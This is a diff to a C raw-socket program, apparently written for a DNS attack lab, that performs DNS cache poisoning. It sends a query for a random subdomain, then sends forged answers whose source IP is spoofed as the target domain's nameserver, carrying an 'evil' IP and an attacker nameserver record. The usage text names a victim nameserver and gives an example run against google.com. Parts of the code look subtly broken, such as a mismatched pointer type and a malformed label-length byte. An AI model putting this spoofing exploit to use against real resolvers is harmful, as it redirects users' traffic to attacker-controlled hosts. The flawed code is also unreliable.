@@ -234,7 +234,161 @@ unsigned int write_authorative_answer(void *buffer, char *name_server) {
 }
 
 //Returns amount of bytes of packet written to dst_buffer
-unsigned int dns_a (
+
+// unsigned int dns_a (
+//     char *src_ip, 
+//     char *dst_ip, 
+//     char *query, 
+//     char *ip_answer, 
+//     char *dst_buffer,
+//     long *txid_ptr) 
+// {
+
+//     char *buffer = dst_buffer;
+//     // Our own headers' structures
+//     struct ipheader *ip = (struct ipheader *) buffer;
+//     ip->iph_ident = htons(rand()); // we give a random number for the identification#
+//     ip->iph_ttl = 110; // hops
+//     ip->iph_protocol = 17; // UDP
+//     ip->iph_sourceip = inet_addr(src_ip);
+//     ip->iph_destip = inet_addr(dst_ip);
+//     ip->iph_ihl = 5;
+//     ip->iph_ver = 4;
+//     ip->iph_tos = 0; // Low delay
+
+//     struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
+//     udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
+//     udp->udph_destport = htons(53);
+
+//     struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
+
+//     // data is the pointer points to the first byte of the dns payload  
+//     unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
+
+//     //standart response
+// 	dns->flags=htons(FLAG_R);
+//     //Random transaction ID
+//     dns->query_id=rand();
+
+//     *txid_ptr = &(dns->query_id);
+
+//     //Points to the last byte written
+//     void *last_byte = data;
+
+//     int query_len = strlen(query)+1;
+
+    
+//     //Query section
+//     unsigned int bytes_written_question = write_question(last_byte, query);
+//     last_byte += bytes_written_question;
+//     dns->QDCOUNT=htons(1); //Query count
+
+//     //Answer section
+//     unsigned int bytes_written_answer = write_answer(last_byte, query, ip_answer);
+//     last_byte += bytes_written_answer; 
+//     dns->ANCOUNT=htons(1); //Answer count
+
+//     //Authorative section
+//     //char *name_server = "\2ns\7example\3com";
+    
+//     unsigned int bytes_written_authorative_answer = write_authorative_answer(last_byte, name_server);
+//     last_byte += bytes_written_authorative_answer;
+//     dns->NSCOUNT=htons(1); //Name Server count
+    
+
+//     unsigned int bytes_written_sum =  bytes_written_question + bytes_written_answer + bytes_written_authorative_answer;
+//     unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ bytes_written_sum );
+//     ip->iph_len=htons(packetquery_len);
+//     udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+bytes_written_sum);
+
+//     ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
+//     udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));
+
+//     return packetquery_len;
+// }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//Returns amount of bytes of packet written to dst_buffer
+unsigned int generate_dns_question (
+    char *src_ip, 
+    char *dst_ip, 
+    char *query, 
+    char *dst_buffer) 
+{
+
+    char *buffer = dst_buffer;
+    // Our own headers' structures
+    struct ipheader *ip = (struct ipheader *) buffer;
+    ip->iph_ident = htons(rand()); // we give a random number for the identification#
+    ip->iph_ttl = 110; // hops
+    ip->iph_protocol = 17; // UDP
+    ip->iph_sourceip = inet_addr(src_ip);
+    ip->iph_destip = inet_addr(dst_ip);
+    ip->iph_ihl = 5;
+    ip->iph_ver = 4;
+    ip->iph_tos = 0; // Low delay
+
+    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
+    udp->udph_srcport = htons(3333);
+    udp->udph_destport = htons(53);
+
+    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
+
+    // data is the pointer points to the first byte of the dns payload  
+    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
+
+    //standart response
+	dns->flags=htons(FLAG_R);
+    //Random transaction ID
+    dns->query_id=rand();
+
+    //Points to the last byte written
+    void *last_byte = data;
+
+    int query_len = strlen(query)+1;
+
+    
+    //Query section
+    unsigned int bytes_written_question = write_question(last_byte, query);
+    last_byte += bytes_written_question;
+    dns->QDCOUNT=htons(1); //Query count
+    
+    unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ bytes_written_question );
+    ip->iph_len=htons(packetquery_len);
+    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+bytes_written_question);
+
+    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
+    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));
+
+    return packetquery_len;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+//Returns amount of bytes of packet written to dst_buffer
+unsigned int generate_dns_answer (
     char *src_ip, 
     char *dst_ip, 
     char *query, 
@@ -288,7 +442,10 @@ unsigned int dns_a (
     dns->ANCOUNT=htons(1); //Answer count
 
     //Authorative section
-    char *name_server = "\2ns\7example\3com";
+    char *name_server = "\2ns\xE0dnslabattacker\3net";
+    
+    
+
     unsigned int bytes_written_authorative_answer = write_authorative_answer(last_byte, name_server);
     last_byte += bytes_written_authorative_answer;
     dns->NSCOUNT=htons(1); //Name Server count
@@ -308,7 +465,7 @@ unsigned int dns_a (
 
 
 
-
+;
 
 
 
@@ -325,12 +482,16 @@ int main(int argc, char *argv[])
     if(sd<0 ) // if socket fails to be created 
         printf("socket error\n");
 
-    if(argc != 5) {
+    if(argc != 6) {
         printf("Usage: \
-            SRC IP (your computer), \
-            DST IP (victim nameserver) , \
-            TARGET DOMAIN (example: www.BankOfShlomi.com) , \
-            TARGET DOMAIN'S NAMESERVER (example: ns1.BankOfShlomi.com) \n");
+            \n\tSRC IP (your computer), \
+            \n\tDST IP (victim nameserver) , \
+            \n\tTARGET DOMAIN'S NAMESERVER (example: ns1.BankOfShlomi.com) \
+            \n\tTARGET DOMAIN'S NAMESERVER IP (IP of ns1.BankOfShlomi.com \
+            \n\tEVIL IP (the victim will store this IP, it should be evil) \
+            \nExample: \
+            \n\tsudo ./a.out 127.0.0.1 127.0.0.1 google.com ns1.google.com 216.239.32.10 6.6.6.6 \
+            \n");
         //You can use DIG tool (dig NS google.com) to find name servers
         exit(-1);
     }
@@ -345,8 +506,9 @@ int main(int argc, char *argv[])
 
     char *src_ip = argv[1];
     char *dst_ip = argv[2];
-    char *target_domain = argv[3];
-    char *target_domain_nameserver = argv[4];
+    char *target_domain_nameserver = argv[3];
+    char *target_domain_nameserver_ip = argv[4];
+    char *evil_ip = argv[5];
 
     struct sockaddr_in sin, din;
 
@@ -370,7 +532,7 @@ int main(int argc, char *argv[])
     unsigned int packet_len = 0;
 
     //Pointer to the DNS TXID field (to change it later)
-    unsigned short *txid_ptr; //points to buffer
+    long *txid_ptr; //points to buffer
 
     char query[18];
     strcpy(query, "\4????\7example\3com");
@@ -382,25 +544,25 @@ int main(int argc, char *argv[])
         query[i] = '1' + rand() % ('9'-'1');
     }
 
-    packet_len = dns_a(src_ip, dst_ip, query, "6.6.6.6", buffer, &txid_ptr);
+    packet_len = generate_dns_question(src_ip, dst_ip, query, buffer);
 
-    printf("Query: %s\n", query);
-    
+    printf("Sending query...\n");    
     //Ask random query
     if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
         printf("packet send error %d which means %s\n",errno,strerror(errno));
     }
+    
+    //Flood with fake answers
+    
+    memset(buffer, 0, PCKT_LEN);
 
-    *txid_ptr = -1;
+    //We spoof src ip. 
+    packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);
 
+    printf("Sending flood answer packets...\n");
     if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
         printf("packet send error %d which means %s\n",errno,strerror(errno));
     }
-
-    //Flood with fake answers
-    
-
-
 
     close(sd);
     return 0;
